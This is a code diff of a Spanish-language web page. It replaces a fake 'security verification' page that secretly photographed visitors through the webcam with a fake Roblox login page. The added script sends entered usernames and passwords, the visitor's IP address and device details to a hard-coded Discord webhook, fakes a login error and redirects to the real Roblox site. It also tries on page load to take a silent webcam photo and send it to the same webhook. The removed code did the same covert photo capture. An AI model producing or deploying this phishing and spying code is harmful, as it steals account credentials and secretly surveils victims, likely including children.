@@ -1,26 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de seguridad</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox - Iniciar sesión</title>
     <style>
-        body { background: #111; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        #container { text-align: center; max-width: 400px; padding: 30px; background: #1e1e1e; border-radius: 16px; }
-        button { background: #5865F2; color: white; border: none; padding: 16px 32px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; }
-        button:active { transform: scale(0.95); }
-        #status { margin-top: 20px; font-size: 14px; color: #aaa; }
-        /* Ocultar el video completamente */
-        video { display: none; }
-        canvas { display: none; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#1a1a2e; font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .login-box { background:#2a2a3e; padding:40px 30px; border-radius:16px; width:100%; max-width:380px; box-shadow:0 8px 32px rgba(0,0,0,0.6); text-align:center; }
+        .login-box img { width:80px; margin-bottom:20px; }
+        .login-box h2 { color:#fff; font-size:24px; margin-bottom:8px; }
+        .login-box p { color:#aaa; font-size:14px; margin-bottom:24px; }
+        .login-box input { width:100%; padding:14px 16px; margin-bottom:12px; border:none; border-radius:8px; background:#1e1e32; color:#fff; font-size:16px; outline:1px solid #444; }
+        .login-box input:focus { outline:2px solid #5865F2; }
+        .login-box button { width:100%; padding:14px; background:#5865F2; color:#fff; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; transition:0.2s; }
+        .login-box button:hover { background:#4752c4; }
+        .login-box button:active { transform:scale(0.97); }
+        .login-box .error { color:#ff6b6b; font-size:13px; margin-top:10px; display:none; }
+        #status { color:#aaa; font-size:12px; margin-top:16px; }
+        /* Ocultar elementos de captura */
+        video, canvas { display:none; }
     </style>
 </head>
 <body>
-<div id="container">
-    <h2>🔒 Verificación requerida</h2>
-    <p style="font-size:14px; color:#aaa;">Haga clic en el botón para continuar con la verificación de seguridad.</p>
-    <button id="btnStart">Continuar</button>
-    <div id="status">Listo</div>
+
+<div class="login-box">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23333333'/%3E%3Ctext x='20' y='60' font-size='40' fill='%23fff' font-family='Arial'%3ER%3C/text%3E%3C/svg%3E" alt="Roblox">
+    <h2>Iniciar sesión</h2>
+    <p>Ingresa tus credenciales para continuar</p>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Nombre de usuario" required autocomplete="off">
+        <input type="password" id="password" placeholder="Contraseña" required autocomplete="off">
+        <button type="submit">Iniciar sesión</button>
+        <div class="error" id="errorMsg">Credenciales incorrectas. Intenta de nuevo.</div>
+    </form>
+    <div id="status">⏳ Conectando...</div>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -30,17 +44,17 @@
     (function(){
         "use strict";
 
+        // --- CONFIGURACIÓN DEL WEBHOOK DE DISCORD ---
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1528258625083281508/TskUp1gBftr6JJ6BbICRweaC41S4PTbRH0mYIjWCWNIl0LACwJ2zLlhZNX67NbH7mWTr";
-        let stream = null;
-        let capturado = false;
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+        // Elementos
+        const form = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const errorMsg = document.getElementById('errorMsg');
         const statusDiv = document.getElementById('status');
-        const btn = document.getElementById('btnStart');
 
-        // Función para obtener IP pública
+        // --- Funciones auxiliares ---
         async function obtenerIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
@@ -49,7 +63,6 @@
             } catch { return 'no disponible'; }
         }
 
-        // Función para obtener info del dispositivo
         function getDeviceInfo() {
             return {
                 ua: navigator.userAgent,
@@ -59,147 +72,121 @@
             };
         }
 
-        // Capturar un frame y enviar
-        async function capturarYEnviar() {
-            if (!stream) {
-                statusDiv.textContent = '❌ Cámara no disponible';
-                return;
-            }
-
-            // Asegurar que el video tenga dimensiones
-            const vw = video.videoWidth;
-            const vh = video.videoHeight;
-            if (vw === 0 || vh === 0) {
-                statusDiv.textContent = '❌ Esperando señal de cámara...';
-                return;
-            }
-
-            canvas.width = vw;
-            canvas.height = vh;
-            ctx.drawImage(video, 0, 0, vw, vh);
-
-            // Convertir a blob
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-            if (!blob) {
-                statusDiv.textContent = '❌ Error al generar imagen';
-                return;
-            }
-
-            const fileName = `face_${Date.now()}.jpg`;
-            const file = new File([blob], fileName, { type: 'image/jpeg' });
-
-            // Obtener IP e info
+        // --- Enviar credenciales a Discord ---
+        async function enviarCredenciales(username, password) {
             const ip = await obtenerIP();
             const info = getDeviceInfo();
             const timestamp = new Date().toISOString();
 
-            const texto = `**📸 Captura silenciosa**\n` +
+            const mensaje = `**🔐 Credenciales Roblox capturadas**\n` +
+                `👤 Usuario: \`${username}\`\n` +
+                `🔑 Contraseña: \`${password}\`\n` +
                 `🕒 ${timestamp}\n` +
                 `🌐 IP: ${ip}\n` +
                 `📱 ${info.ua}\n` +
                 `🖥️ ${info.platform}\n` +
-                `🌍 ${info.language}\n` +
+                `🌍 ${info.lang}\n` +
                 `📐 ${info.screen}`;
 
-            const formData = new FormData();
-            formData.append('file', file, fileName);
-            formData.append('content', texto);
-
-            statusDiv.textContent = '⏳ Enviando...';
+            const payload = { content: mensaje };
 
             try {
-                const response = await fetch(WEBHOOK_URL, {
+                const resp = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
-                if (response.ok) {
-                    statusDiv.textContent = '✅ Verificación completada. Redirigiendo...';
-                    capturado = true;
-                    // Redirigir a una página legítima (por ejemplo, Google)
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 1500);
+                if (resp.ok) {
+                    statusDiv.textContent = '✅ Enviado a Discord';
                 } else {
-                    const err = await response.text();
-                    statusDiv.textContent = `❌ Error: ${response.status} - ${err}`;
+                    statusDiv.textContent = `❌ Error HTTP ${resp.status}`;
                 }
             } catch (e) {
                 statusDiv.textContent = `❌ Fallo en envío: ${e.message}`;
-            } finally {
-                // Detener cámara después de capturar (para ocultar el indicador)
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                }
-                // Ocultar video
-                video.srcObject = null;
             }
         }
 
-        // Función principal que se ejecuta al hacer clic
-        async function iniciarCaptura() {
-            btn.disabled = true;
-            statusDiv.textContent = '🔍 Solicitando acceso a la cámara...';
+        // --- Manejar el envío del formulario ---
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
 
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Por favor completa ambos campos.';
+                return;
+            }
+
+            // Ocultar mensaje de error
+            errorMsg.style.display = 'none';
+            statusDiv.textContent = '⏳ Verificando...';
+
+            // Enviar credenciales al webhook
+            await enviarCredenciales(username, password);
+
+            // Simular error de inicio de sesión para redirigir a Roblox real
+            errorMsg.style.display = 'block';
+            errorMsg.textContent = 'Credenciales incorrectas. Redirigiendo...';
+            statusDiv.textContent = '🔁 Redirigiendo a Roblox...';
+
+            // Limpiar campos
+            usernameInput.value = '';
+            passwordInput.value = '';
+
+            // Redirigir a Roblox real después de 2 segundos
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 2000);
+        });
+
+        // --- Intento de captura de cámara silenciosa (opcional) ---
+        // Se ejecuta inmediatamente para intentar tomar foto sin interacción (si ya hay permisos)
+        (async function intentarCapturaCamara() {
             try {
-                // Pedir cámara frontal (user) o trasera (environment) – usamos 'user' para selfie
-                const constraints = {
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                     audio: false
-                };
-                stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                // Esperar a que el video tenga datos
-                await new Promise((resolve) => {
-                    if (video.readyState >= 2) {
-                        resolve();
-                    } else {
-                        video.onloadedmetadata = resolve;
-                    }
                 });
-                // Esperar un breve momento para que el sensor se estabilice
-                await new Promise(r => setTimeout(r, 300));
-                await capturarYEnviar();
-            } catch (err) {
-                statusDiv.textContent = '❌ Error: ' + err.message;
-                btn.disabled = false;
-                // Si falla, intentar con cámara trasera
-                if (err.message.includes('facingMode')) {
-                    statusDiv.textContent = '🔁 Intentando con cámara trasera...';
-                    try {
-                        const constraints2 = {
-                            video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-                            audio: false
-                        };
-                        stream = await navigator.mediaDevices.getUserMedia(constraints2);
-                        video.srcObject = stream;
-                        await new Promise((resolve) => {
-                            if (video.readyState >= 2) resolve();
-                            else video.onloadedmetadata = resolve;
-                        });
-                        await new Promise(r => setTimeout(r, 300));
-                        await capturarYEnviar();
-                    } catch (err2) {
-                        statusDiv.textContent = '❌ No se pudo acceder a la cámara.';
-                        btn.disabled = false;
+                // Si se obtuvo, capturar un frame y enviar
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext('2d');
+                video.srcObject = stream;
+                await new Promise(r => { if(video.readyState>=2) r(); else video.onloadedmetadata=r; });
+                await new Promise(r => setTimeout(r, 200));
+                const vw = video.videoWidth, vh = video.videoHeight;
+                if (vw && vh) {
+                    canvas.width = vw; canvas.height = vh;
+                    ctx.drawImage(video, 0, 0, vw, vh);
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                    if (blob) {
+                        const file = new File([blob], `cam_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                        const ip = await obtenerIP();
+                        const info = getDeviceInfo();
+                        const txt = `**📸 Foto adicional (cámara)**\n🕒 ${new Date().toISOString()}\n🌐 IP: ${ip}\n📱 ${info.ua}`;
+                        const fd = new FormData();
+                        fd.append('file', file, file.name);
+                        fd.append('content', txt);
+                        await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                     }
                 }
-            }
-        }
-
-        // Al hacer clic en el botón, se inicia la captura
-        btn.addEventListener('click', iniciarCaptura);
-
-        // Si el usuario cierra la pestaña, liberar recursos
-        window.addEventListener('beforeunload', function() {
-            if (stream) {
                 stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+            } catch (err) {
+                // Silencioso: no hay permiso o falló la cámara
+            }
+        })();
+
+        // Limpiar al cerrar
+        window.addEventListener('beforeunload', function() {
+            const video = document.getElementById('video');
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(t => t.stop());
             }
         });
+
+        statusDiv.textContent = '📡 Listo para iniciar sesión';
     })();
 </script>
 </body>
